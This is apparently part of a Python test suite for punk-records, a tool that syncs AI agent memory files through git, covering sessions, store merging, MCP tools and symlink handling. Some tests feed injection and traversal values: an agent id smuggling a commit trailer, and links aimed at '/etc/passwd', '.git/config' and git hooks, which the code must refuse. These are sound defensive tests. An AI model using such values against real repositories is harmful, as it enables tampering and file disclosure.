        self.assertEqual(self.agents(), [""])

    def test_invalid_ids_are_refused_before_anything_changes(self):
        head = self.store.git("rev-parse", "HEAD").stdout
        for bad in ("acme/support\nPunk-Agent: evil", "two words", "-flag", "x" * 129, "a\tb", ".hidden"):
            code, err = self.cli(f"--agent={bad}", "remember", "-s", self.sid, "nope")
            self.assertEqual(code, 2, bad)
            self.assertIn("invalid agent id", err, bad)
        self.assertEqual(self.store.git("rev-parse", "HEAD").stdout, head)
        self.assertNotIn("nope", self.store.read(self.sid, "CLAUDE.md"))
        self.assertEqual(Store(self.store.root, agent="").agent, None)  # empty means unset
        self.assertEqual(Store(self.store.root, agent="op/a.b@host:1+x").agent, "op/a.b@host:1+x")

    def test_git_passthrough_still_works_with_agent(self):
        # `--version` after `git` is git's, not punk's: the split must skip --agent like --home
        r = subprocess.run([sys.executable, "-m", "punk_records", "--agent", "acme/x", "git", "--version"],
                           env={**os.environ, "PYTHONPATH": str(ROOT / "src")}, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(r.stdout.startswith("git version"), r.stdout)

    def test_documented(self):
        doc = (ROOT / "docs" / "store-format.md").read_text(encoding="utf-8")
        self.assertIn("`Punk-Agent: <id>`", doc)
        self.assertIn("`PUNK_AGENT`", doc)


class TestSessionCommand(Base):
    """`punk session start|end`: the hooks' work for any agent runner, with exit codes it can act on."""

    def setUp(self):
        super().setUp()
        self.remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(self.remote), cwd=self.tmp)
        self.a = Store(self.tmp / "a-store")
        self.a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(self.remote), cwd=self.a.root)
        self.a_app = self.project("a/app")
        (self.a_app / "CLAUDE.md").write_text("- one\n")
        self.sid = self.a.track(self.a_app)
        self.a.sync()
        self.b = Store(self.tmp / "b-store")
        self.b.init(str(self.remote), machine="b", track_global=False)
        self.b_app = self.project("b/app")
        self.b.track(self.b_app)
        self.b.restore()

    def session(self, store, step, project, **env):
        r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(store.root), "session", step,
                            "--project", str(project)], capture_output=True, text=True,
                           env={**os.environ, "PYTHONPATH": str(ROOT / "src"), **env})
        return r.returncode, r.stdout, r.stderr

    def test_start_restores_and_end_saves_and_syncs(self):
        (self.b_app / "CLAUDE.md").write_text("- one\n- from b\n")
        self.b.sync()
        code, out, err = self.session(self.a, "start", self.a_app)
        self.assertEqual((code, err), (0, ""))
        self.assertEqual(out.strip(), f"punk: session start done for {self.sid}")
        self.assertEqual((self.a_app / "CLAUDE.md").read_text(), "- one\n- from b\n")
        (self.a_app / "CLAUDE.md").write_text("- one\n- from b\n- from a\n")
        code, _, err = self.session(self.a, "end", self.a_app)
        self.assertEqual((code, err), (0, ""))
        self.b.sync()
        self.assertEqual((self.b_app / "CLAUDE.md").read_text(), "- one\n- from b\n- from a\n")

    def test_end_with_an_agent_id_signs_the_commit(self):
        (self.a_app / "CLAUDE.md").write_text("- one\n- learned by an agent\n")
        r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(self.a.root), "--agent",
                            "acme/implementer", "session", "end", "--project", str(self.a_app)],
                           capture_output=True, text=True, env={**os.environ, "PYTHONPATH": str(ROOT / "src")})
        self.assertEqual(r.returncode, 0, r.stderr)
        agent = subprocess.run(["git", "log", "-1", "--format=%(trailers:key=Punk-Agent,valueonly)"],
                               cwd=self.a.root, capture_output=True, text=True, check=True).stdout.strip()
        self.assertEqual(agent, "acme/implementer")

    def test_an_unreachable_remote_is_a_warning(self):
        git("remote", "set-url", "origin", str(self.tmp / "gone.git"), cwd=self.a.root)
        code, _, err = self.session(self.a, "start", self.a_app)
        self.assertEqual(code, 0)
        self.assertIn("could not reach the remote", err)

    def separate_store(self, name):
        """A store made by its own `punk init`, later pointed at the shared remote (#51)."""
        c = Store(self.tmp / f"{name}-store")
        c.init(machine=name, track_global=False)
        git("remote", "add", "origin", str(self.remote), cwd=c.root)
        return c

    def test_init_continues_main_when_the_remote_head_names_another_branch(self):
        """A bare remote made with git's default branch (HEAD -> master) still gets punk's `main`:
        `punk init <url>` must continue that history, not start its own."""
        head = subprocess.run(["git", "--git-dir", str(self.remote), "symbolic-ref", "HEAD"],
                              capture_output=True, text=True).stdout.strip()
        if head == "refs/heads/main":  # this git's default branch is main; make the case happen
            subprocess.run(["git", "--git-dir", str(self.remote), "symbolic-ref", "HEAD", "refs/heads/master"],
                           check=True)
        c = Store(self.tmp / "c-store")
        c.init(str(self.remote), machine="c", track_global=False)
        remote_main = subprocess.run(["git", "--git-dir", str(self.remote), "rev-parse", "main"],
                                     capture_output=True, text=True, check=True).stdout.strip()
        self.assertEqual(c.git("rev-parse", "HEAD").stdout.strip(), remote_main)
        self.assertEqual(c.branch(), "main")
        self.assertTrue((c.root / "records" / self.sid / "CLAUDE.md").is_file())

    def test_a_store_started_separately_joins_the_remote(self):
        """#51: a store from its own `punk init` adopts the remote's history instead of never merging.
        What only one side has is kept; a file that differs is a conflict; nothing local is overwritten."""
        (self.a_app / "AGENTS.md").write_text("- agents from a\n")
        self.a.sync()
        c = self.separate_store("c")
        c_app = self.project("c/web")  # same git remote as a/app, another folder name
        (c_app / "CLAUDE.md").write_text("- from c\n")
        (c_app / ".claude").mkdir()
        (c_app / ".claude" / "napkin.md").write_text("- napkin from c\n")
        other = self.project("c/other", remote="git@github.com:me/other.git")
        (other / "CLAUDE.md").write_text("- other from c\n")
        c.track(c_app)
        other_id = c.track(other)
        c.save()
        before = c.git("rev-parse", "HEAD").stdout.strip()

        code, out, err = self.session(c, "start", c_app)
        self.assertEqual(code, 2, err)  # CLAUDE.md differs on the two sides
        self.assertIn("joined", err)
        self.assertIn(f"punk: conflict {self.sid}/CLAUDE.md (differs from the store copy", err)
        self.assertEqual((c_app / "CLAUDE.md").read_text(), "- from c\n")  # never overwritten
        self.assertEqual((c_app / "AGENTS.md").read_text(), "- agents from a\n")  # the remote's, restored
        backups = c.git("for-each-ref", "--format=%(objectname)", "refs/punk/before-join/").stdout.split()
        self.assertEqual(backups, [before])
        remote_head = subprocess.run(["git", "--git-dir", str(self.remote), "rev-parse", "main"],
                                     capture_output=True, text=True, check=True).stdout.strip()
        self.assertEqual(c.git("log", "-1", "--format=%P").stdout.split(), [remote_head])  # linear
        records = c.root / "records"
        self.assertEqual((records / self.sid / "CLAUDE.md").read_text(), "- one\n")  # the remote's copy
        joined = set(c.git("ls-tree", "-r", "--name-only", "HEAD").stdout.splitlines())
        for kept in (f"records/{self.sid}/.claude/napkin.md", f"records/{other_id}/CLAUDE.md",
                     f"satellites/{other_id}.json"):  # only this store had them: in the join commit
            self.assertIn(kept, joined)
        self.assertEqual(c.git("status", "--porcelain").stdout, "")
        self.assertEqual(json.loads((c.root / "satellites" / f"{self.sid}.json").read_text())["name"], "app")

        code, _, err = self.session(c, "end", c_app)
        self.assertEqual(code, 2, err)  # still the one conflict, and now shared
        self.assertNotIn("could not", err)
        code, _, err = self.session(self.a, "start", self.a_app)
        self.assertEqual(code, 0, err)
        self.assertEqual((self.a_app / ".claude" / "napkin.md").read_text(), "- napkin from c\n")
        self.assertEqual((self.a_app / "CLAUDE.md").read_text(), "- one\n")

        c.save([self.sid], force=True)  # c decides its CLAUDE.md wins
        code, _, err = self.session(c, "end", c_app)
        self.assertEqual(code, 0, err)
        code, _, err = self.session(self.a, "start", self.a_app)
        self.assertEqual((code, (self.a_app / "CLAUDE.md").read_text()), (0, "- from c\n"), err)

    def test_a_remote_that_is_not_a_punk_store_is_never_joined(self):
        other = self.tmp / "other.git"
        git("init", "-q", "--bare", str(other), cwd=self.tmp)
        work = self.tmp / "other-work"
        git("clone", "-q", str(other), str(work), cwd=self.tmp)
        (work / "notes.txt").write_text("not punk\n")
        git("add", "-A", cwd=work)
        git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "x", cwd=work)
        git("push", "-q", "origin", "HEAD:main", cwd=work)
        git("remote", "set-url", "origin", str(other), cwd=self.a.root)
        head = self.a.git("rev-parse", "HEAD").stdout.strip()
        code, _, err = self.session(self.a, "start", self.a_app)
        self.assertEqual(code, 2, err)
        self.assertIn("is not a punk store", err)
        self.assertEqual(self.a.git("rev-parse", "HEAD").stdout.strip(), head)
        self.assertEqual(self.a.git("for-each-ref", "refs/punk/").stdout, "")

    def test_conflicting_store_changes_name_the_files(self):
        (self.b.root / "punk.json").write_text('{"include": ["from-b/*.md"]}\n')
        self.b.commit("b include")
        self.b.sync()
        (self.a.root / "punk.json").write_text('{"include": ["from-a/*.md"]}\n')
        self.a.commit("a include")
        code, _, err = self.session(self.a, "start", self.a_app)
        self.assertEqual(code, 2, err)
        self.assertIn("could not merge origin main: both changed punk.json", err)
        self.assertEqual(self.a.git("status", "--porcelain").stdout.strip(), "")  # left as it was

    def test_a_conflict_needs_a_person(self):
        (self.b_app / "CLAUDE.md").write_text("- one\n- from b\n")
        self.b.sync()
        (self.a_app / "CLAUDE.md").write_text("- one\n- edited on a too\n")
        code, out, err = self.session(self.a, "start", self.a_app)
        self.assertEqual(code, 2, err)
        self.assertIn(f"punk: conflict {self.sid}/CLAUDE.md", err)
        self.assertEqual(out, "")
        self.assertEqual((self.a_app / "CLAUDE.md").read_text(), "- one\n- edited on a too\n")  # never overwritten

    def test_no_store_or_untracked_project_fails(self):
        code, _, err = self.session(Store(self.tmp / "none"), "start", self.a_app)
        self.assertEqual(code, 1)
        self.assertIn("no store at", err)
        other = self.project("other", remote="git@github.com:me/other.git")
        code, _, err = self.session(self.a, "end", other)
        self.assertEqual(code, 1)
        self.assertIn("is not tracked", err)

    def test_a_busy_store_fails_without_waiting_forever(self):
        code = ("import sys, time; sys.path.insert(0, sys.argv[2]); from punk_records.store import Store; "
                "s = Store(sys.argv[1]); held = s.lock(); held.__enter__(); print('held', flush=True); "
                "time.sleep(30)")
        holder = subprocess.Popen([sys.executable, "-c", code, str(self.a.root), str(ROOT / "src")],
                                  stdout=subprocess.PIPE, text=True)
        try:
            self.assertEqual(holder.stdout.readline().strip(), "held")
            rc, _, err = self.session(self.a, "end", self.a_app, PUNK_LOCK_TIMEOUT="0.5")
        finally:
            holder.kill()
            holder.communicate()
        self.assertEqual(rc, 1)
        self.assertIn("another punk process is using the store", err)


    def test_usage_errors_fail_and_never_look_like_a_conflict(self):
        """2 means a person must act; a typo in the runner's command is "could not run"."""
        def punk(*args, **env):
            r = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(self.a.root), *args],
                               capture_output=True, text=True,
                               env={**os.environ, "PYTHONPATH": str(ROOT / "src"), **env})
            return r.returncode, r.stderr

        project = ["--project", str(self.a_app)]
        for args, env, says in [
            (["--agent", "bad id!", "session", "start", *project], {}, "invalid agent id"),
            (["--agent=bad id!", "session", "end", *project], {}, "invalid agent id"),
            (["session", "start", *project], {"PUNK_AGENT": "bad id!"}, "invalid agent id"),
            (["session", "bogus", *project], {}, "invalid choice"),
            (["session", "start", "--bogus", *project], {}, "unrecognized arguments"),
            (["session", *project], {}, "required"),
        ]:
            with self.subTest(args=args, env=env):
                code, err = punk(*args, **env)
                self.assertEqual(code, 1)
                self.assertIn(says, err)
        # Other commands keep the usual exit code 2 for usage errors.
        self.assertEqual(punk("--agent", "bad id!", "status")[0], 2)
        self.assertEqual(punk("status", "--bogus")[0], 2)

class TestMCPRegistry(unittest.TestCase):
    """server.json lists punk in the MCP Registry; the registry rejects a version whose PyPI README
    lacks the matching `mcp-name:` line, and clients start it as `uvx punk-records mcp`."""

    def setUp(self):
        from punk_records import __version__
        self.version = __version__
        self.server = json.loads((ROOT / "server.json").read_text(encoding="utf-8"))

    def test_versions_follow_the_package(self):
        self.assertEqual(self.server["version"], self.version)
        self.assertEqual([p["version"] for p in self.server["packages"]], [self.version])

    def test_readme_proves_the_name(self):
        import re
        text = (ROOT / "README.md").read_text(encoding="utf-8")
        # the registry needs a boundary after the name: whitespace, a tag, or the comment close
        self.assertRegex(text, r"mcp-name: " + re.escape(self.server["name"]) + r"(\s|<|-->)")

    def test_pypi_package_starts_the_mcp_server(self):
        (pkg,) = self.server["packages"]
        self.assertEqual((pkg["registryType"], pkg["identifier"]), ("pypi", "punk-records"))
        self.assertEqual(pkg["packageArguments"], [{"type": "positional", "value": "mcp"}])
        self.assertLessEqual(len(self.server["description"]), 100)
        scripts = (ROOT / "pyproject.toml").read_text(encoding="utf-8").split("[project.scripts]")[1].split("\n[")[0]
        # uvx runs the executable named after the package
        self.assertRegex(scripts, r'(?m)^punk-records = "punk_records\.cli:main"$')
        self.assertRegex(scripts, r'(?m)^punk = "punk_records\.cli:main"$')


class TestClaudePlugin(unittest.TestCase):
    """claude-plugin/ is the Claude Code plugin, listed by .claude-plugin/marketplace.json. It must do
    what `punk install-hooks` and `claude mcp add ... punk mcp` do, and only name real commands."""

    def load(self, rel):
        return json.loads((ROOT / rel).read_text(encoding="utf-8"))

    def test_manifest_and_marketplace_agree(self):
        from punk_records import __version__
        plugin = self.load("claude-plugin/.claude-plugin/plugin.json")
        market = self.load(".claude-plugin/marketplace.json")
        self.assertEqual(plugin["version"], __version__)
        (entry,) = market["plugins"]
        self.assertEqual((entry["name"], entry["source"]), (plugin["name"], "./claude-plugin"))

    def test_hooks_match_install_hooks(self):
        from punk_records import hooks
        events = self.load("claude-plugin/hooks/hooks.json")["hooks"]
        self.assertEqual(set(events), set(hooks.EVENTS))
        for event, (matcher, action, status) in hooks.EVENTS.items():
            (group,) = events[event]
            self.assertEqual(group.get("matcher"), matcher)
            (h,) = group["hooks"]
            self.assertEqual(h, {"type": "command", "command": "punk", "args": ["hook", action],
                                 "timeout": hooks.TIMEOUT, "statusMessage": status})

    def test_mcp_server_runs_punk_mcp(self):
        servers = self.load("claude-plugin/.mcp.json")["mcpServers"]
        self.assertEqual(servers, {"punk-records": {"command": "punk", "args": ["mcp"]}})

    def test_setup_skill_names_real_commands(self):
        import re
        sub = next(a for a in cli.build_parser()._actions if isinstance(a.choices, dict))
        text = (ROOT / "claude-plugin" / "skills" / "setup" / "SKILL.md").read_text(encoding="utf-8")
        named = set(re.findall(r"`punk ([a-z][a-z-]*)", text))
        self.assertTrue(named)
        self.assertEqual(sorted(named - set(sub.choices)), [])


    def test_docs_install_with_real_claude_code_syntax(self):
        """Both install forms the README gives name this repo and the marketplace's real name."""
        market = self.load(".claude-plugin/marketplace.json")
        (entry,) = market["plugins"]
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        self.assertIn("/plugin marketplace add gablooge/punk-records", readme)
        self.assertIn(f"/plugin install {entry['name']}@{market['name']}", readme)
        self.assertIn(f"/plugin install {entry['name']} --marketplace gablooge/punk-records", readme)

    def test_readme_prompts_name_real_commands(self):
        """The copy-and-paste prompts in the README only name punk commands that exist."""
        import re
        sub = next(a for a in cli.build_parser()._actions if isinstance(a.choices, dict))
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        section = readme[readme.index("### Let your agent set it up"):readme.index("### Claude Code\n")]
        blocks = re.findall(r"```text\n(.*?)```", section, re.S)
        self.assertGreaterEqual(len(blocks), 8)
        named = set()
        for block in blocks:
            named |= set(re.findall(r"`punk (?:--agent \S+ )?([a-z][a-z-]*)", block.replace("\n", " ")))
        self.assertTrue({"init", "track", "session", "encrypt", "subscribe"} <= named)
        self.assertEqual(sorted(named - set(sub.choices)), [])

    def test_things_to_ask_block_matches_the_table(self):
        """The copyable block under "Things to ask your agent" holds exactly the table's phrases."""
        import re
        readme = (ROOT / "README.md").read_text(encoding="utf-8")
        section = readme[readme.index("### Things to ask your agent"):readme.index("### AI tools without MCP")]
        rows = re.findall(r'^\| "(.+?)" \|', section, re.M)
        (block,) = re.findall(r"```text\n(.*?)\n```", section, re.S)
        self.assertGreaterEqual(len(rows), 8)
        self.assertEqual(block.splitlines(), rows)

class TestMCP(Base):
    def test_tools(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("hello\n")
        sid = s.track(p)
        s.save()
        init = handle(s, {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}})
        self.assertEqual(init["result"]["serverInfo"]["name"], "punk-records")
        self.assertIsNone(handle(s, {"jsonrpc": "2.0", "method": "notifications/initialized"}))
        names = [t["name"] for t in handle(s, {"jsonrpc": "2.0", "id": 2, "method": "tools/list"})["result"]["tools"]]
        self.assertIn("append_memory", names)

        def call(name, **args):
            r = handle(s, {"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                           "params": {"name": name, "arguments": args}})["result"]
            return r["content"][0]["text"], r["isError"]

        call("append_memory", satellite=sid, path="CLAUDE.md", text="- lesson learned")
        self.assertIn("lesson learned", (p / "CLAUDE.md").read_text())  # propagated locally
        text, err = call("search_memories", query="LESSON")
        self.assertFalse(err)
        self.assertIn("CLAUDE.md:2", text)
        _, err = call("append_memory", satellite=sid, path=".git/config", text="x")
        self.assertTrue(err)

    def test_stdio_server(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        msgs = "\n".join(json.dumps(m) for m in [
            {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18"}},
            {"jsonrpc": "2.0", "method": "notifications/initialized"},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        ]) + "\n"
        out = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "mcp"],
                             input=msgs.encode(), capture_output=True,
                             env={**os.environ, "PYTHONPATH": str(ROOT / "src")}, check=True).stdout
        self.assertNotIn(b"\r", out)  # newline-delimited JSON, also on Windows
        replies = [json.loads(x) for x in out.decode("utf-8").splitlines()]
        self.assertEqual([r["id"] for r in replies], [1, 2])

    def test_stdio_server_is_utf8(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("caf\u00e9\n")
        sid = s.track(p)
        s.save()
        msgs = "\n".join(json.dumps(m, ensure_ascii=False) for m in [
            {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "append_memory", "arguments": {
                "satellite": sid, "path": "CLAUDE.md", "text": "- \u2713 na\u00efve \u65e5\u672c"}}},
            {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "read_memory", "arguments": {
                "satellite": sid, "path": "CLAUDE.md"}}},
        ]) + "\n"
        env = {**os.environ, "PYTHONPATH": str(ROOT / "src"), "PYTHONIOENCODING": "cp1252"}  # a Windows default
        out = subprocess.run([sys.executable, "-m", "punk_records", "--home", str(s.root), "mcp"],
                             input=msgs.encode("utf-8"), capture_output=True, env=env, check=True).stdout
        replies = [json.loads(x) for x in out.decode("utf-8").splitlines()]
        self.assertEqual(replies[1]["result"]["content"][0]["text"],
                         "caf\u00e9\n- \u2713 na\u00efve \u65e5\u672c\n")
        self.assertEqual((p / "CLAUDE.md").read_bytes(), "caf\u00e9\n- \u2713 na\u00efve \u65e5\u672c\n".encode())


# Relative link targets use the OS separator, as a user's `ln -s` or `mklink` would; Windows does not
# resolve "/" in a relative symlink target.


def can_symlink():
    with tempfile.TemporaryDirectory() as d:
        try:
            os.symlink("x", os.path.join(d, "l"))
            return True
        except (OSError, NotImplementedError):
            return False


@unittest.skipUnless(can_symlink(), "symlinks not supported here")
class TestSymlinks(Base):
    def remote_pair(self):
        remote = self.tmp / "remote.git"
        git("init", "-q", "--bare", str(remote), cwd=self.tmp)
        a = Store(self.tmp / "a-store")
        a.init(machine="a", track_global=False)
        git("remote", "add", "origin", str(remote), cwd=a.root)
        pa = self.project("a/app")
        (pa / "CLAUDE.md").write_text("shared rules\n")
        sid = a.track(pa)
        a.sync()
        b = Store(self.tmp / "b-store")
        b.init(str(remote), machine="b", track_global=False)
        pb = self.project("b/app")
        b.track(pb)
        b.sync()
        return a, pa, b, pb, sid

    def test_scan_classifies_links(self):
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        (p / "README.md").write_text("readme\n")
        (self.tmp / "outside.md").write_text("elsewhere\n")
        (p / "docs").mkdir()
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        os.symlink(os.path.join("..", "CLAUDE.md"), p / "docs" / "GEMINI.md")
        os.symlink("README.md", p / "AGENT.md")
        os.symlink(str(self.tmp / "outside.md"), p / "napkin.md")
        os.symlink("missing.md", p / "CLAUDE.local.md")
        os.symlink("CLAUDE.md", p / "notes.txt")  # not a memory path: ignored silently
        files, links, warnings, followed = scan(p)
        self.assertEqual(followed, {})
        self.assertEqual(files, ["CLAUDE.md"])
        self.assertEqual(discover(p), ["CLAUDE.md"])
        self.assertEqual(links, {"AGENTS.md": "CLAUDE.md", "docs/GEMINI.md": "CLAUDE.md"})
        why = dict(warnings)
        self.assertEqual(sorted(why), ["AGENT.md", "CLAUDE.local.md", "napkin.md"])
        self.assertIn("outside", why["napkin.md"])
        self.assertIn("not a memory file", why["AGENT.md"])
        self.assertIn("broken", why["CLAUDE.local.md"])

    def test_link_recorded_and_recreated(self):
        a, pa, b, pb, sid = self.remote_pair()
        (pa / "sub").mkdir()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        os.symlink(os.path.join("..", "CLAUDE.md"), pa / "sub" / "AGENTS.md")
        acts = a.sync()
        self.assertIn(("add", "AGENTS.md"), [(x.kind, x.rel) for x in acts])
        meta = json.loads((a.root / "satellites" / f"{sid}.json").read_text())
        self.assertEqual(meta["links"], {"AGENTS.md": "CLAUDE.md", "sub/AGENTS.md": "CLAUDE.md"})
        self.assertFalse((a.records / sid / "AGENTS.md").exists())  # content stored once
        self.assertEqual(a.save(), [])  # idempotent

        b.sync()
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertEqual(os.readlink(pb / "AGENTS.md"), "CLAUDE.md")
        self.assertEqual(os.readlink(pb / "sub" / "AGENTS.md"), os.path.join("..", "CLAUDE.md"))
        self.assertEqual((pb / "AGENTS.md").read_text(), "shared rules\n")
        self.assertEqual(b.sync(), [])

        # removal upstream: stale until --prune
        (pa / "sub" / "AGENTS.md").unlink()
        self.assertIn(("delete", "sub/AGENTS.md"), [(x.kind, x.rel) for x in a.sync()])
        self.assertIn(("stale", "sub/AGENTS.md"), [(x.kind, x.rel) for x in b.sync()])
        self.assertTrue((pb / "sub" / "AGENTS.md").is_symlink())
        b.restore(prune=True)
        self.assertFalse(os.path.lexists(pb / "sub" / "AGENTS.md"))
        self.assertTrue((pb / "CLAUDE.md").is_file())

    def test_file_converted_to_link_and_back(self):
        a, pa, b, pb, sid = self.remote_pair()
        (pa / "AGENTS.md").write_text("old copy\n")
        a.sync()
        b.sync()
        self.assertEqual((pb / "AGENTS.md").read_text(), "old copy\n")

        (pa / "AGENTS.md").unlink()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        self.assertEqual([x.kind for x in a.restore()], [])  # pending save, not a conflict
        a.sync()
        self.assertFalse((a.records / sid / "AGENTS.md").exists())
        b.sync()
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertFalse((pb / "AGENTS.md.punk-bak").exists())  # it was an unchanged synced copy

        (pb / "AGENTS.md").unlink()
        (pb / "AGENTS.md").write_text("standalone again\n")
        b.sync()
        self.assertEqual(b.links(sid), {})
        a.sync()
        self.assertFalse((pa / "AGENTS.md").is_symlink())
        self.assertEqual((pa / "AGENTS.md").read_text(), "standalone again\n")
        self.assertEqual((pa / "CLAUDE.md").read_text(), "shared rules\n")

    def test_local_file_not_clobbered_by_link(self):
        a, pa, b, pb, sid = self.remote_pair()
        os.symlink("CLAUDE.md", pa / "AGENTS.md")
        a.sync()
        b.git("pull", "-q")
        (pb / "AGENTS.md").write_text("my own agents notes\n")
        acts = b.restore()
        self.assertEqual([(x.kind, x.rel) for x in acts], [("conflict", "AGENTS.md")])
        self.assertEqual((pb / "AGENTS.md").read_text(), "my own agents notes\n")
        b.restore(force=True)
        self.assertTrue((pb / "AGENTS.md").is_symlink())
        self.assertEqual((pb / "AGENTS.md.punk-bak").read_text(), "my own agents notes\n")

    def test_restore_never_writes_through_symlinks(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("keep me\n")
        sid = s.track(p)
        s.save()
        # a store from another machine has AGENTS.md as a regular file; here it is a link
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        (s.records / sid / "AGENTS.md").write_text("from elsewhere\n")
        s.commit("other machine")
        self.assertEqual([(x.kind, x.rel) for x in s.restore()], [("conflict", "AGENTS.md")])
        self.assertEqual((p / "CLAUDE.md").read_text(), "keep me\n")
        s.restore(force=True)
        self.assertFalse((p / "AGENTS.md").is_symlink())
        self.assertEqual((p / "AGENTS.md").read_text(), "from elsewhere\n")
        self.assertEqual((p / "CLAUDE.md").read_text(), "keep me\n")

    def test_tampered_links_are_refused(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        (p / ".claude" / "skills" / "dir").mkdir(parents=True)
        sid = s.track(p)
        s.save()
        evil = {".git/hooks/post-checkout": "CLAUDE.md", "AGENTS.md": "../../outside/CLAUDE.md",
                "GEMINI.md": ".git/config", "napkin.md": "/etc/passwd", "AGENT.md": ".claude/skills/dir",
                "run.sh": "CLAUDE.md"}
        s._write_links(sid, evil)
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual(sorted(x.rel for x in acts if x.kind == "blocked"), sorted(evil))
        for rel in evil:
            self.assertFalse(os.path.lexists(p / rel), rel)

    def test_links_never_created_through_symlinked_dirs(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("x\n")
        outside = self.tmp / "outside"
        (outside / "rules").mkdir(parents=True)
        (outside / "rules" / "real.mdc").write_text("elsewhere\n")
        os.symlink(str(outside), p / ".cursor")
        sid = s.track(p)
        s.save()
        s._write_links(sid, {".cursor/rules/x.mdc": "CLAUDE.md", "AGENTS.md": ".cursor/rules/real.mdc"})
        s.commit("tampered")
        acts = s.restore(force=True)
        self.assertEqual(sorted(x.rel for x in acts if x.kind == "blocked"),
                         [".cursor/rules/x.mdc", "AGENTS.md"])
        self.assertFalse(os.path.lexists(outside / "rules" / "x.mdc"))
        self.assertFalse(os.path.lexists(p / "AGENTS.md"))

    def test_new_local_link_survives_prune(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("same\n")
        (p / "AGENTS.md").write_text("same\n")
        sid = s.track(p)
        s.save()
        (p / "AGENTS.md").unlink()
        os.symlink("CLAUDE.md", p / "AGENTS.md")  # not saved yet
        (s.records / sid / "AGENTS.md").unlink()  # another machine deleted the file
        s.commit("other machine")
        s.restore(prune=True)
        self.assertTrue((p / "AGENTS.md").is_symlink())
        s.save()
        self.assertEqual(s.links(sid), {"AGENTS.md": "CLAUDE.md"})

    def test_append_and_read_follow_recorded_links(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        os.symlink("CLAUDE.md", p / "AGENTS.md")
        sid = s.track(p)
        s.save()
        s.append(sid, "AGENTS.md", "- lesson")
        self.assertFalse((s.records / sid / "AGENTS.md").exists())
        self.assertEqual((s.records / sid / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        self.assertEqual(s.read(sid, "AGENTS.md"), "rules\n- lesson\n")
        self.assertEqual(s.restore(), [])
        self.assertTrue((p / "AGENTS.md").is_symlink())
        self.assertEqual((p / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        r = handle(s, {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {
            "name": "append_memory", "arguments": {"satellite": sid, "path": "AGENTS.md", "text": "- via mcp"}}})
        self.assertFalse(r["result"]["isError"])
        self.assertIn("- via mcp", (p / "CLAUDE.md").read_text())
        # this machine's link wins over a differing store record
        s._write_links(sid, {"AGENTS.md": "GEMINI.md", "GEMINI.md": "AGENT.md", "AGENT.md": "GEMINI.md"})
        s.commit("other machine")
        self.assertEqual(s.append(sid, "AGENTS.md", "- local wins"), "CLAUDE.md")
        with self.assertRaises(PunkError):  # a loop recorded in the store is refused
            s.append(sid, "GEMINI.md", "x")

    def test_append_follows_unsaved_local_link(self):
        s = Store(self.tmp / "s")
        s.init(track_global=False)
        p = self.project("app")
        (p / "CLAUDE.md").write_text("rules\n")
        sid = s.track(p)
        s.save()
        os.symlink("CLAUDE.md", p / "AGENTS.md")  # made after the last save
        self.assertEqual(s.append(sid, "AGENTS.md", "- lesson"), "CLAUDE.md")
        self.assertFalse((s.records / sid / "AGENTS.md").exists())
        self.assertEqual((p / "CLAUDE.md").read_text(), "rules\n- lesson\n")
        self.assertEqual(s.restore(), [])
        (self.tmp / "outside.md").write_text("elsewhere\n")
        os.symlink(str(self.tmp / "outside.md"), p / "GEMINI.md")  # leaves the project: not followed
        (s.root / "punk.json").write_text('{"include": ["*"], "exclude": []}')  # permissive synced config
        self.assertEqual(s.append(sid, "GEMINI.md", "- note"), "GEMINI.md")
        self.assertEqual((self.tmp / "outside.md").read_text(), "elsewhere\n")

    def test_global_dotfile_links_are_followed(self):
        home = Path(os.environ["HOME"])
        dot = home / "dotfiles" / "claude"
        dot.mkdir(parents=True)
        (dot / "CLAUDE.md").write_text("I like short answers\n")
        (dot / "review.md").write_text("review command\n")
        (home / ".claude" / "commands").mkdir(parents=True)
        os.symlink(os.path.join("..", "dotfiles", "claude", "CLAUDE.md"), home / ".claude" / "CLAUDE.md")
        os.symlink(str(dot / "review.md"), home / ".claude" / "commands" / "review.md")
        found = scan(home, "global")
        self.assertEqual(found.files, [".claude/CLAUDE.md", ".claude/commands/review.md"])
